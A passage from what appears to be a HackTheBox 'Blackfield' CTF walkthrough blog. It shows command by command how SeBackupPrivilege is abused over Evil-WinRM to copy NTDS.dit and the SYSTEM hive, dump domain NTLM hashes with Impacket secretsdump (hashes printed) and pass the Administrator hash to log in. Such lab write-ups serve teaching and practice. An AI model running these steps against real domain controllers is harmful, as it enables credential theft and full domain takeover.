SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</code></pre></div></div>
<h2 id="to-get-the-ntdsdit-i-need-to-fool-the-system-in-order-to-do-so">To get the <code class="language-plaintext highlighter-rouge">NTDS.dit</code> I need to fool the system in order to do so.</h2>

<p><a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug</a></p>

<h2 id="after-uploading-both-the-dll-files">After Uploading both the <code class="language-plaintext highlighter-rouge">.dll</code> files.</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\S</span>eBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:<span class="se">\W</span>indows<span class="se">\t</span>emp<span class="se">\S</span>eBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\t</span>emp&gt; 
</code></pre></div></div>
<h2 id="time-to-import-the-modules">Time to import the modules.</h2>

<blockquote>
  <p><code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\Windows\temp&gt; import-module .\SeBackupPrivilegeUtils.dll</code>
<code class="language-plaintext highlighter-rouge">*Evil-WinRM* PS C:\Windows\temp&gt; import-module .\SeBackupPrivilegeCmdLets.dll</code></p>
</blockquote>

<h3 id="time-to-copy-ntdsdit">Time to copy <code class="language-plaintext highlighter-rouge">NTDS.dit</code></h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> <span class="no">Copy</span><span class="o">-</span><span class="no">FileSebackupPrivilege</span> <span class="n">z</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="no">NTDS</span><span class="p">\</span><span class="n">ntds</span><span class="p">.</span><span class="nf">dit</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">ndts</span><span class="p">.</span><span class="nf">dit</span>
<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="no">Directory</span><span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span>


<span class="no">Mode</span>                <span class="no">LastWriteTime</span>         <span class="no">Length</span> <span class="no">Name</span>
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>            <span class="mi">628</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">11_14</span><span class="o">-</span><span class="mi">44</span><span class="o">-</span><span class="mi">35</span><span class="n">_DC01</span><span class="p">.</span><span class="nf">cab</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="no">PM</span>             <span class="mi">90</span> <span class="n">jeevan</span><span class="p">.</span><span class="nf">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">1</span><span class="p">:</span><span class="mi">13</span> <span class="no">PM</span>         <span class="mi">135470</span> <span class="no">MpCmdRun</span><span class="p">.</span><span class="nf">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">56</span> <span class="no">PM</span>       <span class="mi">18874368</span> <span class="n">ndts</span><span class="p">.</span><span class="nf">dit</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>          <span class="mi">12288</span> <span class="no">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="nf">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="no">PM</span>          <span class="mi">16384</span> <span class="no">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="nf">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>            <span class="mi">102</span> <span class="n">silconfig</span><span class="p">.</span><span class="nf">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>          <span class="mi">63072</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmsvc</span><span class="p">.</span><span class="nf">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="no">PM</span>          <span class="mi">15832</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmusr</span><span class="p">.</span><span class="nf">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="no">PM</span>           <span class="mi">1728</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmvss</span><span class="p">.</span><span class="nf">log</span>


<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Windows</span><span class="p">\</span><span class="n">temp</span><span class="o">&gt;</span> 

</code></pre></div></div>

<h3 id="file-successfully-copied">File successfully copiedâ€¦</h3>
<p><code class="language-plaintext highlighter-rouge">-a----        7/11/2020   2:56 PM       18874368 ndts.dit</code></p>

<h3 id="having-only-ntdsdit-is-not-going-to-help-so-i-need-one-more-file-ie-system">Having only <code class="language-plaintext highlighter-rouge">NTDS.dit</code> is not going to help, so i need one more file ie <code class="language-plaintext highlighter-rouge">SYSTEM</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span>\<span class="n">system</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>\<span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="n">The</span> <span class="n">operation</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="n">Directory</span><span class="p">:</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>


<span class="n">Mode</span>                <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>            <span class="mi">628</span> <span class="mi">2020</span><span class="o">-</span><span class="mi">07</span><span class="o">-</span><span class="mi">11_14</span><span class="o">-</span><span class="mi">44</span><span class="o">-</span><span class="mi">35</span><span class="n">_DC01</span><span class="p">.</span><span class="n">cab</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">44</span> <span class="n">PM</span>             <span class="mi">90</span> <span class="n">jeevan</span><span class="p">.</span><span class="n">txt</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">1</span><span class="p">:</span><span class="mi">13</span> <span class="n">PM</span>         <span class="mi">135470</span> <span class="n">MpCmdRun</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">56</span> <span class="n">PM</span>       <span class="mi">18874368</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="n">PM</span>          <span class="mi">12288</span> <span class="n">SeBackupPrivilegeCmdLets</span><span class="p">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">2</span><span class="p">:</span><span class="mi">54</span> <span class="n">PM</span>          <span class="mi">16384</span> <span class="n">SeBackupPrivilegeUtils</span><span class="p">.</span><span class="n">dll</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>            <span class="mi">102</span> <span class="n">silconfig</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">01</span> <span class="n">PM</span>       <span class="mi">17346560</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>          <span class="mi">63072</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmsvc</span><span class="p">.</span><span class="n">log</span>
<span class="o">------</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">43</span> <span class="n">PM</span>          <span class="mi">15832</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmusr</span><span class="p">.</span><span class="n">log</span>
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">7</span><span class="o">/</span><span class="mi">11</span><span class="o">/</span><span class="mi">2020</span>  <span class="mi">12</span><span class="p">:</span><span class="mi">42</span> <span class="n">PM</span>           <span class="mi">1728</span> <span class="n">vmware</span><span class="o">-</span><span class="n">vmvss</span><span class="p">.</span><span class="n">log</span>


<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> 
</code></pre></div></div>
<h3 id="as-ive-got-both-the-required-files-now-its-time-to-download-the-files-to-dump-secrets">As Iâ€™ve got both the required files, now its time to download the files to dump <code class="language-plaintext highlighter-rouge">secrets</code>..</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span><span class="o">&gt;</span> <span class="n">download</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>
<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">Temp</span>\<span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> <span class="n">to</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span>

<span class="n">Progress</span><span class="p">:</span> <span class="mi">11</span><span class="o">%</span> <span class="p">:</span> <span class="o">|</span><span class="err">â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><span class="o">|</span> 


<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span><span class="o">&gt;</span> <span class="n">download</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>
<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">temp</span>\<span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">to</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>

<span class="n">Progress</span><span class="p">:</span> <span class="mi">6</span><span class="o">%</span> <span class="p">:</span> <span class="o">|</span><span class="err">â–’â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘</span><span class="o">|</span>        
</code></pre></div></div>
<h4 id="wait-till-the-procress-is-completed">Wait till the procress is completed.</h4>

<h2 id="dumping-ntlm">Dumping <code class="language-plaintext highlighter-rouge">NTLM</code></h2>

<h2 id="using-impacket-for-secretdump">Using <code class="language-plaintext highlighter-rouge">impacket</code> for <code class="language-plaintext highlighter-rouge">secretdump</code></h2>

<h3 id="secretsdumppy--ntds-ntdsdit--system-systembak-local"><code class="language-plaintext highlighter-rouge">secretsdump.py -ntds ntds.dit -system system.bak LOCAL</code></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secretsdump</span><span class="p">.</span><span class="n">py</span>  <span class="o">-</span><span class="n">ntds</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> <span class="o">-</span><span class="n">system</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">LOCAL</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="mf">9.22</span><span class="p">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20200611.111621</span><span class="p">.</span><span class="mi">760</span><span class="n">cb1ea</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2020</span> <span class="n">SecureAuth</span> <span class="n">Corporation</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Target</span> <span class="n">system</span> <span class="n">bootKey</span><span class="p">:</span> <span class="mh">0x73d83e56de8961ca9f243e1a49638393</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">Domain</span> <span class="n">Credentials</span> <span class="p">(</span><span class="n">domain</span>\<span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Searching</span> <span class="k">for</span> <span class="n">pekList</span><span class="p">,</span> <span class="n">be</span> <span class="n">patient</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">PEK</span> <span class="c1"># 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Reading</span> <span class="ow">and</span> <span class="n">decrypting</span> <span class="n">hashes</span> <span class="k">from</span> <span class="n">ndts</span><span class="p">.</span><span class="n">dit</span> 
<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">184</span><span class="n">fb5e5178480be64824d4cd53b99ee</span><span class="p">:::</span>
<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
<span class="n">DC01</span><span class="err">$</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">65557</span><span class="n">f7ad03ac340a7eb12b9462f80d6</span><span class="p">:::</span>
<span class="n">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">d3c02561bba6ee4ad6cfd024ec8fda5d</span><span class="p">:::</span>
<span class="n">audit2020</span><span class="p">:</span><span class="mi">1103</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c95ac94a048e7c29ac4b4320d7c9d3b5</span><span class="p">:::</span>
<span class="n">support</span><span class="p">:</span><span class="mi">1104</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">cead107bf11ebc28b3e6e90cde6de212</span><span class="p">:::</span>
<span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">local</span>\<span class="n">BLACKFIELD764430</span><span class="p">:</span><span class="mi">1105</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">a658dd0c98e7ac3f46cca81ed6762d1c</span><span class="p">:::</span>
<span class="n">BLACKFIELD</span><span class="p">.</span><span class="n">local</span>\<span class="n">BLACKFIELD538365</span><span class="p">:</span><span class="mi">1106</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">a658dd0c98e7ac3f46cca81ed6762d1c</span><span class="p">:::</span>
</code></pre></div></div>
<h3 id="time-to-get-root-access">Time to get root access</h3>

<h2 id="getting-roottxt">Getting Root.txt</h2>

<p><code>evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u Administrator -i blackfiled.htb</code></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">root</span><span class="o">@</span><span class="n">Ac3</span><span class="p">:</span><span class="o">~</span><span class="c1"># evil-winrm -H 184fb5e5178480be64824d4cd53b99ee -u administrator -i blackfiled.htb
</span>
<span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span> <span class="n">shell</span> <span class="n">v2</span><span class="p">.</span><span class="mi">3</span>

<span class="n">Info</span><span class="p">:</span> <span class="n">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>

<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Documents</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="p">..</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span><span class="o">&gt;</span> <span class="n">cd</span> <span class="n">Desktop</span>
<span class="o">*</span><span class="n">Evil</span><span class="o">-</span><span class="n">WinRM</span><span class="o">*</span> <span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Administrator</span>\<span class="n">Desktop</span><span class="o">&gt;</span> <span class="n">cat</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
<span class="mi">4375</span><span class="n">a</span><span class="o">------------------------</span><span class="mi">5</span><span class="n">cb</span>
</code></pre></div></div>

<hr />

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br />
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>

</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2020-07-11T21:50:00+05:30"><!-- start custom article footer snippet -->

<!-- end custom article footer snippet -->
<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
</div><div class="article__license"><div class="license">
    </p>
  </div></div><p style="color:DodgerBlue;">HTB Badge :P</p>
  <p></p>
  >>>
  <img src="http://www.hackthebox.eu/badge/image/291968" alt="Hack The Box">
  >>>
</footer>
<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/tryhackme/2020/07/08/Haskhell.html">Tryhackme Haskhell</a></div><div class="next"><span>NEXT</span><a href="/hackthebox/retired/2020/07/23/Buff.html">HackTheBox Buff</a></div></div></div>

</div>

<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    $(function() {
      var $this ,$scroll;
      var $articleContent = $('.js-article-content');
      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
      $scroll = $(scroll);

      $articleContent.find('.highlight').each(function() {
        $this = $(this);
        $this.attr('data-lang', $this.find('code').attr('data-lang'));
      });
      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
        $this = $(this);
        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
      });
      $articleContent.on('click', '.anchor', function() {
        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
      });
    });
  });
})();
</script>
</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->

<!-- end custom main bottom snippet -->
</div>
            </div></div></div><div class="page__footer d-print-none">
<footer class="footer py-4 js-page-footer">
  <div class="main"><div itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jeevan"><meta itemprop="url" content="/"><meta itemprop="description" content="HACKER	||	PENETRATION TESTER	||	CTF PLAYER	||	BLOGGER || INDEPENDENT RESEARCHER."><div class="footer__author-links"><div class="author-links">
  <ul class="menu menu--nowrap menu--inline"></ul>
</div>
</div>
    </div><div class="site-info mt-2">
      <div>Â© D3c0deZ3r0 2021,
        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> 
      </div>
    </div>
  </div>
</footer>
</div></div>
    </div><script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $body = $('body'), $window = $(window);
    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
    var activeCount = 0;
    function modal(options) {
      var $root = this, visible, onChange, hideWhenWindowScroll = false;
      var scrollTop;
      function setOptions(options) {
        var _options = options || {};
        visible = _options.initialVisible === undefined ? false : show;
        onChange = _options.onChange;
        hideWhenWindowScroll = _options.hideWhenWindowScroll;
      }
      function init() {
        setState(visible);
      }
      function setState(isShow) {
        if (isShow === visible) {
          return;
        }
        visible = isShow;
        if (visible) {
          activeCount++;
          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
          $root.addClass('modal--show');
          $pageMain.scrollTop(scrollTop);
          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
          $window.on('keyup', handleKeyup);
        } else {
          activeCount > 0 && activeCount--;
          $root.removeClass('modal--show');
          $window.scrollTop(scrollTop);
          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
          $window.off('keyup', handleKeyup);
        }
        onChange && onChange(visible);
      }
      function show() {
        setState(true);
      }
      function hide() {
        setState(false);
      }
      function handleKeyup(e) {
        // Char Code: 27  ESC
        if (e.which ===  27) {
          hide();
        }
      }
      setOptions(options);
      init();
      return {
        show: show,
        hide: hide,
        $el: $root
      };
    }
    $.fn.modal = modal;
  });
})();
</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
(function () {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    // search panel
    var search = (window.search || (window.search = {}));
    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
      true : window.useDefaultSearchBox ;

    var $searchModal = $('.js-page-search-modal');
    var $searchToggle = $('.js-search-toggle');
    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
    var modalVisible = false;
    search.searchModal = searchModal;

    var $searchBox = null;
    var $searchInput = null;
    var $searchClear = null;

    function getModalVisible() {
      return modalVisible;
    }
    search.getModalVisible = getModalVisible;

    function handleModalChange(visible) {
      modalVisible = visible;
      if (visible) {
        search.onShow && search.onShow();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
      } else {
        search.onShow && search.onHide();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
        setTimeout(function() {
          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
          search.clear && search.clear();
          window.pageAsideAffix && window.pageAsideAffix.refresh();
        }, 400);
      }
    }

    $searchToggle.on('click', function() {
      modalVisible ? searchModal.hide() : searchModal.show();
    });
    // Char Code: 83  S, 191 /
    $(window).on('keyup', function(e) {
      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
        modalVisible || searchModal.show();
      }
    });

    if (useDefaultSearchBox) {
      $searchBox = $('.js-search-box');
      $searchInput = $searchBox.children('input');
      $searchClear = $searchBox.children('.js-icon-clear');
      search.getSearchInput = function() {
        return $searchInput.get(0);
      };
      search.getVal = function() {
        return $searchInput.val();
      };
      search.setVal = function(val) {
        $searchInput.val(val);
      };

      $searchInput.on('focus', function() {
        $(this).addClass('focus');
      });
      $searchInput.on('blur', function() {
        $(this).removeClass('focus');
      });
      $searchInput.on('input', window.throttle(function() {
        var val = $(this).val();
        if (val === '' || typeof val !== 'string') {
          search.clear && search.clear();
        } else {
          $searchBox.addClass('not-empty');
          search.onInputNotEmpty && search.onInputNotEmpty(val);
        }
      }, 400));
      $searchClear.on('click', function() {
        $searchInput.val(''); $searchBox.removeClass('not-empty');
        search.clear && search.clear();
      });
    }
  });
})();
</script><div class="search search--dark">
  <div class="main">
    <div class="search__header">Search</div>
    <div class="search-bar">
      <div class="search-box js-search-box">
        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
        <input type="text" />
        <div class="search-box__icon-clear js-icon-clear">
          <a><i class="fas fa-times"></i></a>
        </div>
      </div>
      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
        Cancel</button>
    </div>
    <div class="search-result js-search-result"></div>
  </div>
</div>
<script>var SOURCES = window.TEXT_VARIABLES.sources;
var PAHTS = window.TEXT_VARIABLES.paths;
window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
  var search = (window.search || (window.search = {}));
  var searchData = window.TEXT_SEARCH_DATA || {};

  function memorize(f) {
    var cache = {};
    return function () {
      var key = Array.prototype.join.call(arguments, ',');
      if (key in cache) return cache[key];
      else return cache[key] = f.apply(this, arguments);
    };
  }

  /// search
  function searchByQuery(query) {
    var i, j, key, keys, cur, _title, result = {};
    keys = Object.keys(searchData);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      for (j = 0; j < searchData[key].length; j++) {
        cur = searchData[key][j], _title = cur.title;
        if ((result[key] === undefined || result[key] && result[key].length < 4 )
          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
          if (result[key] === undefined) {
            result[key] = [];
          }
          result[key].push(cur);
        }
      }
    }
    return result;
  }

  var renderHeader = memorize(function(header) {
    return $('<p class="search-result__header">' + header + '</p>');
  });

  var renderItem = function(index, title, url) {
